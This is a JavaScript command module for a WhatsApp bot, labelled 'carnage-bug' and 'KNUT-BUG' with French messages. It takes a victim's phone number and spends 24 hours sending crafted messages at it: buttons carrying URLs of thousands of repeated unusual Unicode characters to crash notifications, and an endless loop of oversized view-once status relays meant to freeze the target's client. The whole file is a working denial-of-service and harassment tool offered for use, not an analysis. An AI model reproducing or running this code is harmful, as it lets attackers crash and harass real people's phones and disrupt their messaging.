// ./commands/carnage-bug.js

import { generateWAMessageFromContent } from "@whiskeysockets/baileys";

export default {
  name: "carnage-bug",
  description: "Lance Caranage-Bug sur un numéro",

  async execute(context) {
    const { sock, from, msg, args } = context;

    const targetNumber = args?.[0] || "";

    const opts = msg ? { quoted: msg } : {};

    if (!targetNumber) {
      await sock.sendMessage(from, { text: "> KNUT-BUG\n> Numéro manquant" }, opts);
      return { success: false, message: "Numéro manquant" };
    }

    const number = targetNumber.replace(/[^0-9]/g, "");
    if (number.length < 8) {
      await sock.sendMessage(from, { text: "> KNUT-BUG\n> Numéro invalide" }, opts);
      return { success: false, message: "Numéro invalide" };
    }

    const target = number + "@s.whatsapp.net";

    try {
      // Initiation
      await sock.sendMessage(
        from,
        {
          image: { url: "https://files.catbox.moe/xfhezd.jpg" },
          caption: `> KNUT-BUG - CARNAGE\n\n> Cible : ${number}\n> Durée : 24h`
        },
        opts
      );

      // Paramètres
      const START = Date.now();
      const DURATION = 24 * 60 * 60 * 1000;      // 24 heures
      const ACTION_INTERVAL = 5 * 60 * 1000;     // 5 minutes
      const MAX_PER_HOUR = 12;

      let hourCount = 0;
      let hourStart = Date.now();

      // ========================
      //   FONCTIONS
      // ========================

      async function delaynih(prim, target) {
        while (true) {
          const msg = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  nativeFlowResponseMessage: {
                    version: 3,
                    name: "galaxy_message",
                    paramsJson: "".repeat(1045000)
                  },
                  contextInfo: {
                    entryPointConversionSource: "call_permission_request"
                  },
                  body: { 
                    format: "DEFAULT",
                    text: "THIS IS - PRIMIS" 
                  }
                }
              }
            }
          }, {
            messageTimestamp: (Date.now() / 1000) | 0,
            userJid: target,
            messageId: undefined
          });

          await prim.relayMessage("status@broadcast", msg.message, {
            additionalNodes: [{
              tag: "meta",
              attrs: {},
              content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
              }]
            }],
            messageId: msg.key?.id || undefined,
            statusJidList: [target]
          }, { 
            participant: target 
          });
        }
      }

      async function crashnotif(prim, target) {
        if (!prim || !target) return;

        const XandroidUi = {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: { hasMediaAttachment: false },
                body: { text: "" },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: JSON.stringify({
                        display_text: "OKAY", 
                        url: "https://" + "𑜦𑜠".repeat(5000) + ".com" 
                      })
                    }
                  ]
                },
                contextInfo: {
                  externalAdReply: {
                    renderLargerThumbnail: false,
                    showAdAttribution: false
                  }
                }
              }
            }
          }
        };

        await prim.relayMessage(target, XandroidUi, {
          messageId: prim.generateMessageTag()
        });
      }

      // ========================
      //   BOUCLE PRINCIPALE
      // ========================

      while (Date.now() - START < DURATION) {
        if (Date.now() - hourStart >= 60 * 60 * 1000) {
          hourCount = 0;
          hourStart = Date.now();
        }

        if (hourCount < MAX_PER_HOUR) {
          await crashnotif(sock, target);
          await delaynih(sock, target);
          hourCount++;
        }

        await new Promise(r => setTimeout(r, ACTION_INTERVAL));
      }

      // Fin
      await sock.sendMessage(
        from,
        { text: "> KNUT-BUG\n> CARNAGE terminé\n> Durée : 24h" },
        opts
      );

      return { 
        success: true, 
        message: `Carnage-Bug terminé sur ${number}` 
      };

    } catch (error) {
      console.error("❌ Erreur carnage-bug :", error);

      await sock.sendMessage(
        from,
        { text: "> KNUT-BUG\n> Carnage interrompu" },
        opts
      );

      return { success: false, message: "Carnage interrompu" };
    }
  }
};